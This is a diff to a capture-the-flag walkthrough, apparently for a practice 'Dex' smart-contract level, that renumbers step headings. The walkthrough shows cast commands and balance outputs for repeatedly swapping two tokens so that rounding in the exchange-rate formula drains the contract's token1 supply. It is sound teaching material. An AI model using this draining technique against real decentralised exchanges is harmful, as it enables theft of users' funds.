@@ -66,12 +66,12 @@ contract SwappableToken is ERC20 {
 Because the exchange rate is based on the ratio of `token1` to `token2`, we can **continouly swap the two tokens for each other** till there one of the tokens have no supply left in the contract due to solidity having no floating points.
 
 ### Walkthrough
-1. call the dex's approve function so that we can make the swaps
+##### 1. call the dex's approve function so that we can make the swaps
 ```console
 cast send $LEVEL_ADDRESS "approve(address,uint)" $LEVEL_ADDRESS 1000 --gas 90000 --private-key $PRIVATE_KEY
 ```
 
-2. let's find the address of token1 and token2
+##### 2. let's find the address of token1 and token2
 ```console
 cast call $LEVEL_ADDRESS "token1()"
 ```
@@ -79,7 +79,7 @@ cast call $LEVEL_ADDRESS "token1()"
 cast call $LEVEL_ADDRESS "token2()"
 ```
 
-3. swap all of our token1 to token2
+##### 3. swap all of our token1 to token2
 ```console
 cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN1_ADDRESS $TOKEN2_ADDRESS 10 --gas 250000 --private-key $PRIVATE_KEY
 ```
@@ -93,7 +93,7 @@ token1 : 110
 token2 : 90
 ```
 
-3. swap all of our token2 to token1
+##### 4. swap all of our token2 to token1
 ```console
 cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN2_ADDRESS $TOKEN1_ADDRESS 20 --gas 250000 \
 --private-key $PRIVATE_KEY
@@ -108,7 +108,7 @@ token1 : 86
 token2 : 110
 ```
 
-4. swap all of our token1 to token2
+##### 5. swap all of our token1 to token2
 ```console
 cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN1_ADDRESS $TOKEN2_ADDRESS 24 --gas 250000 \
 --private-key $PRIVATE_KEY
@@ -123,7 +123,7 @@ token1 : 110
 token2 : 80
 ```
 
-5. swap all of our token2 to token1
+##### 6. swap all of our token2 to token1
 ```console
 cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN2_ADDRESS $TOKEN1_ADDRESS 30 --gas 250000 \ 
 --private-key $PRIVATE_KEY
@@ -138,7 +138,7 @@ token1 : 69
 token2 : 110
 ```
 
-6. swap all of our token1 to token2
+##### 7. swap all of our token1 to token2
 ```console
 cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN1_ADDRESS $TOKEN2_ADDRESS 41 --gas 250000 \
 --private-key $PRIVATE_KEY
@@ -153,7 +153,7 @@ token1 : 110
 token2 : 45
 ```
 
-7. we cannot swap 65 `token2` to `token1` as we would expect to receive 158 `token1` in return which is more than the supply in the contract. To drain the contract for all 110 `token1`, we need to swap 45 `token2` to get 110 `token1`
+##### 8. we cannot swap 65 `token2` to `token1` as we would expect to receive 158 `token1` in return which is more than the supply in the contract. To drain the contract for all 110 `token1`, we need to swap 45 `token2` to get 110 `token1`
  
 ```console
 cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN2_ADDRESS $TOKEN1_ADDRESS 45 --gas 250000 \
